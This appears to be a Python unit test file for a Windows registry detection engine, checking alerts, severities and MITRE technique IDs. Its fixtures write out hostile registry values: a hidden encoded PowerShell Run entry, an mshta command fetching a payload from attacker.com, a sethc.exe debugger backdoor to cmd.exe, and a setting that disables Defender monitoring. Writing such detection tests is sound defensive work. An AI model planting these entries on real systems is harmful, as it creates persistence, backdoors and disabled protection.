import unittest
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from core.detection_engine import DetectionEngine

class TestDetectionScenarios(unittest.TestCase):
    def setUp(self):
        self.engine = DetectionEngine()

    def test_powershell_encoded(self):
        change = {
            'registry_key': r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
            'value_name': 'UpdateCheck',
            'action': 'ADDED',
            'new_value': 'powershell.exe -w hidden -enc JAB4AD0AMQA=',
            'view': '64'
        }
        res = self.engine.evaluate_change(change)
        self.assertTrue(res['is_alert'])
        self.assertIn(res['severity'], ['HIGH', 'CRITICAL'])
        self.assertEqual(res['rule_id'], 'REG-EXEC-POWERSHELL-ENC')
        self.assertEqual(res['technique_id'], 'T1059.001')

    def test_lolbin_mshta(self):
        change = {
            'registry_key': r'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce',
            'value_name': 'InstallerPrompt',
            'action': 'ADDED',
            'new_value': 'mshta.exe http://attacker.com/payload.hta',
            'view': '64'
        }
        res = self.engine.evaluate_change(change)
        self.assertTrue(res['is_alert'])
        self.assertIn(res['severity'], ['HIGH', 'CRITICAL'])
        self.assertEqual(res['rule_id'], 'REG-EXEC-LOLBIN')
        self.assertEqual(res['technique_id'], 'T1218')

    def test_ifeo_debugger(self):
        change = {
            'registry_key': r'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe',
            'value_name': 'Debugger',
            'action': 'ADDED',
            'new_value': r'C:\Windows\System32\cmd.exe',
            'view': '64'
        }
        res = self.engine.evaluate_change(change)
        self.assertTrue(res['is_alert'])
        self.assertIn(res['severity'], ['HIGH', 'CRITICAL'])
        self.assertEqual(res['rule_id'], 'REG-PERSIST-IFEO')
        self.assertEqual(res['technique_id'], 'T1546.012')

    def test_defender_tampering(self):
        change = {
            'registry_key': r'HKLM\Software\Policies\Microsoft\Windows Defender',
            'value_name': 'DisableRealtimeMonitoring',
            'action': 'MODIFIED',
            'new_value': 1,
            'view': '64'
        }
        res = self.engine.evaluate_change(change)
        self.assertTrue(res['is_alert'])
        self.assertEqual(res['severity'], 'CRITICAL')
        self.assertEqual(res['rule_id'], 'REG-TAMPER-DEFENDER')
        self.assertEqual(res['technique_id'], 'T1562.001')

    def test_allowlisted_application(self):
        change = {
            'registry_key': r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
            'value_name': 'OneDrive',
            'action': 'ADDED',
            'new_value': r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background',
            'view': '64'
        }
        res = self.engine.evaluate_change(change)
        self.assertFalse(res['is_alert'])
        self.assertEqual(res['severity'], 'INFORMATIONAL')
        self.assertEqual(res['rule_id'], 'ALLOWLIST_MATCH')

if __name__ == '__main__':
    unittest.main(verbosity=2)
